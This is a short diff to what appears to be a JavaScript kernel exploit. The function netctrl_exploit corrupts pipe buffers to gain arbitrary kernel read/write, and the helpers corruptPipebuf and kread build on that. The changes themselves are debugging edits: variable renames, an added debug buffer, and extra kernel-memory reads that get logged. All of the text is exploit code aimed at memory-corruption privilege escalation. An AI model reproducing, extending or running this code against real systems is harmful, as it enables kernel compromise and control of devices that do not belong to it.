@@ -972,11 +972,13 @@ function netctrl_exploit() {
     fhold(fget(victim_pipe[1]));
 
     for(var i=0; i<0x20; i=i+8) {
-        var read = kread64(masterRpipeData.add(i));
-        debug("Reading masterRpipeData[" + i + "] : " + hex(read) );
+        var readed = kread64(masterRpipeData.add(i));
+        debug("Reading masterRpipeData[" + i + "] : " + hex(readed) );
     }
 
     debug("[+] Arbitrary R/W achieved.");
+
+    debug("Reading value in victimRpipeFile: " + hex(kread64(victimRpipeFile)) );
 
     //fhold(fget(master_pipe[0]));
     //fhold(fget(master_pipe[1]));
@@ -1009,6 +1011,7 @@ function removeRthrFromSocket(fd) {
 
 
 const victimPipebuf = malloc(PIPEBUF_SIZE);
+const debug_buffer = malloc(PIPEBUF_SIZE);
 
 function corruptPipebuf(cnt, _in, out, size, buffer) {
     if (buffer.eq(0)) {
@@ -1022,9 +1025,10 @@ function corruptPipebuf(cnt, _in, out, size, buffer) {
     write(masterWpipeFd, victimPipebuf, PIPEBUF_SIZE);
 
     // Debug
-    read(masterRpipeFd, victimPipebuf, PIPEBUF_SIZE);
-    for (i=0; i<PIPEBUF_SIZE; i=i+8) {
-        debug("corrupt_read: " + hex(read64(victimPipebuf.add(i))) );
+    read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
+    for (var i=0; i<PIPEBUF_SIZE; i=i+8) {
+        var readed = read64(victimPipebuf.add(i));
+        debug("corrupt_read: " + hex(readed) );
     }
 
     return //read(masterRpipeFd, victimPipebuf, PIPEBUF_SIZE);
@@ -1039,8 +1043,9 @@ function kread(dest, src, n) {
     corruptPipebuf(n, 0, 0, PAGE_SIZE, src);
     // Debug
     read(victimRpipeFd, dest, n);
-    for (i=0; i<n; i=i+8) {
-        debug("kread_read: " + hex(read64(dest.add(i))) );
+    for (var i=0; i<n; i=i+8) {
+        var readed = read64(dest.add(i));
+        debug("kread_read: " + hex(readed) );
     }
     return
 }
